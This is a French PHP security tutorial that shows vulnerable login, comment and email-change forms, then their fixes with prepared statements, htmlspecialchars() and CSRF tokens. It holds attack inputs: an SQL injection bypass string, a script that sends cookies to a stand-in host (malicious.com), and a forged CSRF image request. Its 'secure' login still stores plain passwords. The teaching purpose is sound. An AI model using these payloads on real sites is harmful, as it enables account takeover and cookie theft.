## 🛑 **Exemples de failles de sécurité dans un formulaire PHP et leurs solutions**  

Les formulaires web sont souvent la cible d'attaques. Voici **trois types d'attaques courantes** et comment les sécuriser en PHP.

🧛‍♂️ ***Ps: Si la persistance donné n'as pas encore été vue, Sauter le point 1.***

---

## 🕵️‍♂️ **1. Injection SQL (SQL Injection)**
📌 **But de l'attaque :**  
Un hacker injecte du code SQL dans un formulaire pour **manipuler la base de données** (ex: voler des comptes, supprimer des données).

### ❌ **Exemple de formulaire vulnérable**
```php
<?php
$conn = new mysqli("localhost", "root", "", "ma_base");

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = $_POST['email'];  // 🚨 Pas de validation
    $password = $_POST['password']; // 🚨 Pas de validation

    // 🚨 L'attaque : Un hacker entre dans le champ email :
    // ' OR 1=1; -- 
    $sql = "SELECT * FROM users WHERE email = '$email' AND password = '$password'";
    $result = $conn->query($sql);

    if ($result->num_rows > 0) {
        echo "Connexion réussie !";
    } else {
        echo "Email ou mot de passe incorrect.";
    }
}
?>
```
📌 **Pourquoi c'est dangereux ?**  
Si un attaquant saisit :  
```
' OR 1=1; -- 
```
L’instruction SQL devient :
```sql
SELECT * FROM users WHERE email = '' OR 1=1; -- AND password = '';
```
💥 Cela **bypass** la connexion et permet d’accéder au compte de n’importe qui !

### ✅ **Solution : Utiliser les requêtes préparées**
**Correction avec `mysqli` :**
```php
<?php
$conn = new mysqli("localhost", "root", "", "ma_base");

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $stmt = $conn->prepare("SELECT * FROM users WHERE email = ? AND password = ?");
    $stmt->bind_param("ss", $email, $password);
    $stmt->execute();
    $result = $stmt->get_result();

    if ($result->num_rows > 0) {
        echo "Connexion réussie !";
    } else {
        echo "Email ou mot de passe incorrect.";
    }
}
?>
```
📌 **Pourquoi c'est sécurisé ?**  
✅ Les **requêtes préparées** empêchent l’injection SQL car les valeurs sont traitées comme des **chaînes de caractères**, et non du code SQL.

## 🕵️‍♂️ **2. Cross-Site Scripting (XSS)**
📌 **But de l'attaque :**  
Un hacker insère du **JavaScript malveillant** dans un formulaire pour **voler des cookies ou rediriger des utilisateurs**.

### ❌ **Exemple de formulaire vulnérable**
```php
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    echo "Votre commentaire : " . $_POST['commentaire']; // 🚨 Pas de protection
}
?>
<form method="POST">
    <textarea name="commentaire"></textarea>
    <button type="submit">Envoyer</button>
</form>
```
📌 **Problème :**  
Si un hacker envoie ce commentaire :
```html
<script>alert('Votre session a expiré, reconnectez-vous');</script>
```
💥 Tous les visiteurs verront une **alerte JavaScript** !  
⚠ Un hacker pourrait voler des cookies :
```html
<script>document.location='http://malicious.com?cookie='+document.cookie;</script>
```

### ✅ **Solution : Échapper les caractères HTML**
**Correction avec `htmlspecialchars()` :**
```php
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $commentaire = htmlspecialchars($_POST['commentaire'], ENT_QUOTES, 'UTF-8');
    echo "Votre commentaire : " . $commentaire; // ✅ Le script est affiché en texte et non exécuté
}
?>
```
📌 **Pourquoi c'est sécurisé ?**  
✅ `htmlspecialchars()` empêche l’exécution du JavaScript en transformant `<script>` en texte brut `&lt;script&gt;`.

## 🕵️‍♂️ **3. CSRF (Cross-Site Request Forgery)**
📌 **But de l'attaque :**  
Un hacker force un utilisateur connecté à exécuter une **action non voulue** (ex: changer son email, faire un virement bancaire).

### ❌ **Exemple d’action vulnérable**
```php
<?php
session_start();
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $_SESSION['email'] = $_POST['email'];  // 🚨 Pas de protection
    echo "Email mis à jour : " . $_SESSION['email'];
}
?>
<form method="POST">
    <input type="email" name="email">
    <button type="submit">Modifier</button>
</form>
```
📌 **Problème :**  
Un hacker peut envoyer un lien :
```html
<img src="http://victime.com/changer_email.php?email=hacker@gmail.com">
```
💥 Si la victime est connectée, son **email sera modifié à son insu** !

### ✅ **Solution : Utiliser un Token CSRF**
1️⃣ **Générer un token CSRF** dans le formulaire :
```php
<?php
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
?>
<form method="POST">
    <input type="email" name="email">
    <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token']; ?>">
    <button type="submit">Modifier</button>
</form>
```
2️⃣ **Vérifier le token avant de traiter le formulaire :**
```php
<?php
session_start();
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die("CSRF détecté !");
    }
    $_SESSION['email'] = $_POST['email'];
    echo "Email mis à jour : " . $_SESSION['email'];
}
?>
```
📌 **Pourquoi c'est sécurisé ?**  
✅ Un attaquant **ne peut pas deviner** le token CSRF, donc la requête malveillante échoue.

---

## 🚀 **Résumé des protections**
| Attaque | Solution |
|---------|---------|
| 🔥 **Injection SQL** | Utiliser les **requêtes préparées** avec `mysqli` ou `PDO` |
| 🎭 **XSS (Cross-Site Scripting)** | Échapper les entrées utilisateur avec `htmlspecialchars()` |
| 🎣 **CSRF (Cross-Site Request Forgery)** | Vérifier un **token CSRF** unique par formulaire |
